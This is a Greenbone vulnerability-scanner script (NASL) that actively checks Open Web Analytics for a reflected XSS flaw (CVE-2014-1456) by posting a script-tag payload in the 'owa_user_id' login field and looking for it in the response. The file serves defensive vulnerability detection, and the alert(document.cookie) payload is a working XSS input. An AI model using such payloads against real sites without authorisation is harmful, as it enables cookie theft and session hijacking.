# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:openwebanalytics:open_web_analytics";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804404");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2014-03-05 13:12:41 +0530 (Wed, 05 Mar 2014)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2014-1456");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Open Web Analytics < 1.5.6 Reflected XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_open_web_analytics_http_detect.nasl");
  script_mandatory_keys("open_web_analytics/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Open Web Analytics is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'owa_user_id' parameter to the login page
  is not properly sanitised before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site.");

  script_tag(name:"affected", value:"Open Web Analytics version 1.5.5 and prior.");

  script_tag(name:"solution", value:"Update to version 1.5.6 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/56885");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65571");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/91124");
  script_xref(name:"URL", value:"http://www.secureworks.com/cyber-threat-intelligence/advisories/SWRX-2014-004");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php";
header = make_array("Content-Type", "application/x-www-form-urlencoded");
data =  "owa_user_id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B" +
        "%3C%2Fscript%3E&owa_password=&owa_go=&owa_action=base.login" +
        "&owa_submit_btn=Login";

req = http_post_put_req(port: port, url: url, data: data, add_headers: header);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && '">alert(document.cookie);">' >< res && ">Web Analytics<" >< res) {
  report = 'It was possible to conduct an XSS attack.\n\nResult:\n\n' + chomp(res);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
